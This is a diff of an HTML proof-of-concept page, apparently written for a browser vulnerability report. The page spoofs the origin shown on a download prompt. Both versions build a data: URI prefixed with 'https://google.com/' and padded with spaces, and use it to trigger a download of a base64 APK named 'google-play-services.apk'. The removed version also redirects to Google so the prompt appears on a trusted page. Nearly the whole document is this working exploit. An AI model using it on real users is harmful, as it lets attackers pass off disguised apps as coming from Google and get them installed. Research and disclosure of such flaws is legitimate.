@@ -1,74 +1,46 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>POC - Download Origin Spoof</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    background: #fff;
-    margin: 0;
-    padding: 40px 16px;
-    text-align: center;
-  }
-  h3 { color: #333; font-size: 16px; }
-  input {
-    width: 85%; max-width: 360px; padding: 14px 18px; font-size: 16px;
-    border: 1px solid #dadce0; border-radius: 24px; outline: none;
-    text-align: center; cursor: pointer;
-    -webkit-tap-highlight-color: transparent;
-  }
-  p { color: #888; font-size: 13px; margin-top: 16px; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>POC - Download Origin Spoof</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #fff; padding: 40px 20px; text-align: center; }
+    h3 { color: #333; }
+    input {
+      padding: 14px 20px; font-size: 16px; border: 2px solid #ea4335;
+      border-radius: 24px; width: 260px; text-align: center; cursor: pointer; outline: none;
+    }
+    .note { color: #666; font-size: 12px; margin-top: 14px; }
+    .info { color: #999; font-size: 11px; margin-top: 30px; line-height: 1.6; }
+  </style>
 </head>
 <body>
+  <h3>Download Origin Spoof POC</h3>
+  <input type="text" id="btn" placeholder="Tap to trigger" readonly>
+  <p class="note">Download prompt will show <b>google.com</b> as origin</p>
+  <p class="info">
+    Real page: <span id="real"></span><br>
+    Download origin shown: <b style="color:#ea4335">data:https://google.com</b>
+  </p>
 
-<h3>POC - Download Origin Spoof</h3>
-<input type="text" id="btn" placeholder="Tap here" readonly>
-<p>Tap the input → redirect to Google + download</p>
+  <script>
+    document.getElementById('real').textContent = window.location.hostname;
 
-<script>
-(function() {
-  'use strict';
+    document.getElementById('btn').addEventListener('click', function() {
+      // Open Google in new tab
+      window.open('https://www.google.com', '_blank');
 
-  var S = ' '.repeat(200);
-  var APK = 'UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
-
-  // Build data URIs with fake origins
-  var DATA_GOOGLE = 'data:https://google.com/' + S + 'application/vnd.android.package-archive;base64,' + APK;
-  var DATA_PLAY   = 'data:https://play.google.com/' + S + 'application/vnd.android.package-archive;base64,' + APK;
-
-  function download(uri, name) {
-    var a = document.createElement('a');
-    a.href = uri;
-    a.download = name;
-    document.body.appendChild(a);
-    a.click();
-    setTimeout(function() { document.body.removeChild(a); }, 50);
-  }
-
-  document.getElementById('btn').addEventListener('click', function() {
-    // 1. Trigger download FIRST
-    download(DATA_GOOGLE, 'google-play-services.apk');
-
-    // 2. Then redirect to Google
-    // Download prompt will appear while user is on Google's page
-    setTimeout(function() {
-      window.location.href = 'https://www.google.com';
-    }, 200);
-  });
-
-  // Also allow tapping anywhere
-  document.body.addEventListener('click', function(e) {
-    if (e.target.tagName === 'INPUT') return;
-    download(DATA_GOOGLE, 'google-play-services.apk');
-    setTimeout(function() {
-      window.location.href = 'https://www.google.com';
-    }, 200);
-  }, { once: true });
-})();
-</script>
-
+      // Trigger download on current page
+      setTimeout(function() {
+        var a = document.createElement('a');
+        a.href = 'data:https://google.com/' + ' '.repeat(200) + 'application/vnd.android.package-archive;base64,UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
+        a.download = 'google-play-services.apk';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }, 500);
+    });
+  </script>
 </body>
 </html>
